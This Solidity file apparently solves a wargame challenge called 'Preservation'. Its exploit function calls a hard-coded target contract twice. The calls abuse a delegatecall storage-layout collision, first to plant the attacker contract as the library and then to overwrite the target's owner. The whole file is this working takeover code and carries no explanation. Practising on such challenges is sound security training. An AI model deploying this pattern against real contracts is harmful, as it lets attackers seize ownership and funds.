// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";

contract PreservationAttack {

    address public t1;
    address public t2;
    address public owner;

    Preservation preservation = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);      

    function exploit() external {
        preservation.setFirstTime(uint256(address(this)));
        preservation.setFirstTime(uint256(0xEAce4b71CA1A128e8B562561f46896D55B9B0246));
    }

    function setTime(address _owner) public {
        owner = _owner;
    }

}